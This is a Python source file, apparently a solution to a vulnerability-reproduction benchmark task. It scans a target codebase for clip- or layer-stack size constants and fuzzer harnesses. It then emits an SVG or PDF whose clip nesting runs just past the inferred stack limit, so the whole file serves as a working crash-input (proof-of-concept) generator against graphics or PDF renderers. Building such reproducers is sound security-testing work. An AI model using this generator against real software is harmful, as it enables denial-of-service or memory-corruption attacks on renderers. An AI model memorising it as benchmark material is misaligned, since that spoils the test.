import os
import re
import tarfile
from typing import Dict, Iterator, List, Optional, Tuple


class _SourceScanner:
    _TEXT_EXTS = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".m", ".mm", ".inc", ".inl", ".ipp", ".ixx",
        ".rs", ".go", ".java", ".kt", ".cs",
        ".py", ".js", ".ts", ".rb", ".php",
        ".txt", ".md", ".rst", ".cmake", ".gn", ".gni",
        ".mak", ".make", ".mk", "CMakeLists.txt",
    }

    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")

    def __del__(self):
        try:
            if self._tar is not None:
                self._tar.close()
        except Exception:
            pass

    @staticmethod
    def _looks_text_path(name: str) -> bool:
        base = os.path.basename(name)
        if base in {"CMakeLists.txt"}:
            return True
        _, ext = os.path.splitext(base)
        return ext.lower() in _SourceScanner._TEXT_EXTS

    def iter_text_files(self, max_bytes: int = 2_000_000) -> Iterator[Tuple[str, str]]:
        if self._is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, self.src_path)
                    if not self._looks_text_path(rel):
                        continue
                    try:
                        st = os.stat(full)
                        if st.st_size <= 0 or st.st_size > max_bytes:
                            continue
                        with open(full, "rb") as f:
                            data = f.read(max_bytes + 1)
                        if len(data) > max_bytes:
                            continue
                        try:
                            txt = data.decode("utf-8", errors="ignore")
                        except Exception:
                            continue
                        yield rel.replace("\\", "/"), txt
                    except Exception:
                        continue
        else:
            assert self._tar is not None
            for m in self._tar.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not self._looks_text_path(name):
                    continue
                if m.size <= 0 or m.size > max_bytes:
                    continue
                try:
                    f = self._tar.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(max_bytes + 1)
                    if len(data) > max_bytes:
                        continue
                    try:
                        txt = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    yield name, txt
                except Exception:
                    continue


class _ConstResolver:
    _re_define = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$")
    _re_constassign = re.compile(
        r"\b(?:static\s+)?(?:constexpr|const)\s+[^;=]*?\b([A-Za-z_]\w*)\s*=\s*([^;]+);"
    )
    _re_enum_block = re.compile(r"\benum\b[^;{]*\{([^}]*)\}", re.S)
    _re_enum_entry = re.compile(r"\b([A-Za-z_]\w*)\s*=\s*([^,}]+)")

    def __init__(self):
        self.expr_defs: Dict[str, str] = {}
        self.vals: Dict[str, int] = {}
        self._visiting: Dict[str, bool] = {}

    @staticmethod
    def _strip_line_comment(s: str) -> str:
        i = s.find("//")
        if i >= 0:
            return s[:i]
        return s

    @staticmethod
    def _remove_block_comments(text: str) -> str:
        return re.sub(r"/\*.*?\*/", "", text, flags=re.S)

    def ingest_text(self, text: str):
        if "#define" not in text and "constexpr" not in text and "const" not in text and "enum" not in text:
            return
        text_nc = self._remove_block_comments(text)
        for line in text_nc.splitlines():
            line = self._strip_line_comment(line).strip()
            if not line:
                continue
            m = self._re_define.match(line)
            if m:
                name = m.group(1)
                if "(" in name:
                    continue
                expr = m.group(2).strip()
                if not expr:
                    continue
                self.expr_defs.setdefault(name, expr)
                continue
            m = self._re_constassign.search(line)
            if m:
                name = m.group(1)
                expr = m.group(2).strip()
                if expr:
                    self.expr_defs.setdefault(name, expr)
        for em in self._re_enum_block.finditer(text_nc):
            block = em.group(1)
            for m in self._re_enum_entry.finditer(block):
                name = m.group(1)
                expr = m.group(2).strip()
                if expr:
                    self.expr_defs.setdefault(name, expr)

    @staticmethod
    def _sanitize_expr(expr: str) -> Optional[str]:
        expr = expr.strip()
        expr = expr.strip(";")
        if not expr:
            return None
        if "sizeof" in expr or "alignof" in expr:
            return None
        expr = re.sub(r"\bstatic_cast<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\breinterpret_cast<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\bconst_cast<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\bdynamic_cast<[^>]+>\s*\(", "(", expr)

        expr = expr.replace("true", "1").replace("false", "0")
        expr = expr.replace("nullptr", "0")

        def _strip_suffix(m: re.Match) -> str:
            return m.group(1)

        expr = re.sub(r"\b(0x[0-9A-Fa-f]+|\d+)(?:[uUlL]{1,3})\b", _strip_suffix, expr)
        expr = expr.replace("/", "//")

        expr = re.sub(r"\s+", " ", expr).strip()
        if not expr:
            return None
        return expr

    def _eval_expr(self, expr: str, depth: int = 0) -> Optional[int]:
        if depth > 30:
            return None
        expr0 = self._sanitize_expr(expr)
        if expr0 is None:
            return None

        tokens = set(re.findall(r"\b[A-Za-z_]\w*\b", expr0))
        if tokens:
            rep: Dict[str, str] = {}
            for t in tokens:
                if t in {"and", "or", "not"}:
                    return None
                v = self.resolve(t)
                if v is None:
                    return None
                rep[t] = str(int(v))
            for t, v in rep.items():
                expr0 = re.sub(r"\b" + re.escape(t) + r"\b", v, expr0)

        if re.search(r"[A-Za-z_]", expr0):
            return None

        if not re.fullmatch(r"[0-9xXa-fA-F\(\)\s\+\-\*%<>\|\&\^~\/]+", expr0):
            return None

        try:
            val = eval(expr0, {"__builtins__": None}, {})
        except Exception:
            return None
        if isinstance(val, bool):
            return int(val)
        if not isinstance(val, int):
            try:
                val = int(val)
            except Exception:
                return None
        return val

    def resolve(self, name: str) -> Optional[int]:
        if name in self.vals:
            return self.vals[name]
        if name in self._visiting:
            return None
        expr = self.expr_defs.get(name)
        if expr is None:
            return None
        self._visiting[name] = True
        try:
            v = self._eval_expr(expr)
            if v is not None:
                self.vals[name] = int(v)
                return self.vals[name]
            return None
        finally:
            self._visiting.pop(name, None)

    def resolve_all_matching(self, name_regex: re.Pattern, limit: int = 50_000) -> Dict[str, int]:
        out: Dict[str, int] = {}
        cnt = 0
        for name in list(self.expr_defs.keys()):
            if not name_regex.search(name):
                continue
            v = self.resolve(name)
            if v is None:
                continue
            out[name] = v
            cnt += 1
            if cnt >= limit:
                break
        return out


def _build_pdf_with_stream(stream: bytes) -> bytes:
    parts: List[bytes] = []
    pos = 0

    def app(b: bytes):
        nonlocal pos
        parts.append(b)
        pos += len(b)

    app(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")

    offsets: List[int] = [0]

    def add_obj(num: int, body: bytes):
        nonlocal pos
        offsets.append(pos)
        app(str(num).encode("ascii") + b" 0 obj\n")
        app(body)
        if not body.endswith(b"\n"):
            app(b"\n")
        app(b"endobj\n")

    add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
    add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    add_obj(
        3,
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << >> /Contents 4 0 R >>",
    )

    stream_header = b"<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n"
    stream_obj = stream_header + stream + (b"\n" if not stream.endswith(b"\n") else b"") + b"endstream"
    add_obj(4, stream_obj)

    xref_pos = pos
    app(b"xref\n")
    app(b"0 5\n")
    app(b"0000000000 65535 f \n")
    for i in range(1, 5):
        app(f"{offsets[i]:010d} 00000 n \n".encode("ascii"))
    app(b"trailer\n")
    app(b"<< /Size 5 /Root 1 0 R >>\n")
    app(b"startxref\n")
    app(str(xref_pos).encode("ascii") + b"\n")
    app(b"%%EOF\n")
    return b"".join(parts)


def _generate_svg(depth: int) -> bytes:
    depth = max(2, int(depth))
    head = b'<svg xmlns="http://www.w3.org/2000/svg"><defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    body = open_tag * depth + b'<rect width="1" height="1"/>' + close_tag * depth
    tail = b"</svg>"
    return head + body + tail


def _generate_pdf(depth: int) -> bytes:
    depth = max(2, int(depth))
    ops = (b"q 0 0 1 1 re W n\n" * depth) + (b"Q\n" * depth)
    return _build_pdf_with_stream(ops)


class Solution:
    def solve(self, src_path: str) -> bytes:
        scanner = _SourceScanner(src_path)
        resolver = _ConstResolver()

        fuzzer_texts: List[str] = []
        global_svg_hits = 0
        global_pdf_hits = 0
        global_json_hits = 0
        global_skp_hits = 0

        stack_candidates: List[int] = []
        name_based_candidates: List[int] = []

        re_layer_clip_stack_name = re.compile(r"(?i)\blayer\w*clip\w*stack\w*\b")
        re_clip_stack_name = re.compile(r"(?i)\bclip\w*stack\w*\b")
        re_stack_depth_name = re.compile(r"(?i)\b(max|kmax)\w*(layer|clip|nest)\w*(stack|depth)\w*\b")

        re_resize = re.compile(r"\b([A-Za-z_]\w*)\s*\.\s*resize\s*\(\s*([^)]+)\s*\)")
        re_array_decl = re.compile(r"\b([A-Za-z_]\w*(?:layer\w*clip\w*stack|clip\w*stack)\w*)\s*\[\s*([^\]]+)\s*\]")
        re_std_array = re.compile(
            r"\bstd::array\s*<\s*[^,>]+,\s*([^>]+)\s*>\s*([A-Za-z_]\w*(?:layer\w*clip\w*stack|clip\w*stack)\w*)\b"
        )
        re_vector_ctor = re.compile(
            r"\b([A-Za-z_]\w*(?:layer\w*clip\w*stack|clip\w*stack)\w*)\s*\(\s*([^)]+)\s*\)"
        )

        for name, text in scanner.iter_text_files():
            lower = text.lower()

            if "llvmfuzzertestoneinput" in lower or "fuzzertestoneinput" in lower:
                fuzzer_texts.append(text)

            if "<svg" in lower:
                global_svg_hits += 5
            if "clip-path" in lower:
                global_svg_hits += 8
            if "xmlns=\"http://www.w3.org/2000/svg\"" in lower:
                global_svg_hits += 10
            if "%pdf-" in lower:
                global_pdf_hits += 20
            if "mupdf" in lower or "fitz" in lower or "pdfium" in lower:
                global_pdf_hits += 8
            if " pdf " in f" {lower} ":
                global_pdf_hits += 1
            if "nlohmann" in lower or "rapidjson" in lower or "cjson" in lower or "json" in lower:
                global_json_hits += 1
            if "skpicture" in lower or ".skp" in lower:
                global_skp_hits += 2

            resolver.ingest_text(text)

            if ("clip" in lower and "stack" in lower) or ("layer" in lower and "clip" in lower) or re_layer_clip_stack_name.search(text):
                for m in re_resize.finditer(text):
                    var = m.group(1)
                    arg = m.group(2).strip()
                    var_l = var.lower()
                    if ("clip" in var_l and "stack" in var_l) or ("layer" in var_l and "clip" in var_l):
                        v = resolver._eval_expr(arg)
                        if v is not None and 2 <= v <= 500_000:
                            stack_candidates.append(int(v))

                for m in re_array_decl.finditer(text):
                    arg = m.group(2).strip()
                    v = resolver._eval_expr(arg)
                    if v is not None and 2 <= v <= 500_000:
                        stack_candidates.append(int(v))

                for m in re_std_array.finditer(text):
                    arg = m.group(1).strip()
                    v = resolver._eval_expr(arg)
                    if v is not None and 2 <= v <= 500_000:
                        stack_candidates.append(int(v))

                for m in re_vector_ctor.finditer(text):
                    var = m.group(1)
                    arg = m.group(2).strip()
                    var_l = var.lower()
                    if ("clip" in var_l and "stack" in var_l) or ("layer" in var_l and "clip" in var_l):
                        v = resolver._eval_expr(arg)
                        if v is not None and 2 <= v <= 500_000:
                            stack_candidates.append(int(v))

        # Resolve constants with relevant names
        rel_consts = resolver.resolve_all_matching(re.compile(r"(?i)(clip|layer|stack|depth|nest)"))
        for k, v in rel_consts.items():
            if 2 <= v <= 500_000 and re_stack_depth_name.search(k):
                name_based_candidates.append(int(v))

        # Decide format based on fuzzers (strong signal) and global markers (weak signal)
        svg_score = global_svg_hits
        pdf_score = global_pdf_hits
        json_score = global_json_hits
        skp_score = global_skp_hits

        for ft in fuzzer_texts[:50]:
            l = ft.lower()
            if "svg" in l or "xml" in l or "clip-path" in l or "<svg" in l:
                svg_score += 200
            if "pdf" in l or "mupdf" in l or "fitz" in l or "pdfium" in l or "%pdf-" in l:
                pdf_score += 200
            if "json" in l or "rapidjson" in l or "nlohmann" in l or "cjson" in l:
                json_score += 100
            if "skpicture" in l or ".skp" in l:
                skp_score += 100

        # Infer required nesting depth
        inferred = None
        if stack_candidates:
            inferred = max(stack_candidates)
        elif name_based_candidates:
            inferred = max(name_based_candidates)

        if inferred is None:
            inferred = 35_000
        depth = int(inferred) + 8
        if depth < 2:
            depth = 2
        if depth > 200_000:
            depth = 200_000

        # Choose between SVG and PDF primarily
        if svg_score >= pdf_score and svg_score >= json_score and svg_score >= skp_score:
            return _generate_svg(depth)
        if pdf_score >= svg_score and pdf_score >= json_score and pdf_score >= skp_score:
            return _generate_pdf(depth)

        # Fallback: SVG (common for clip nesting)
        return _generate_svg(depth)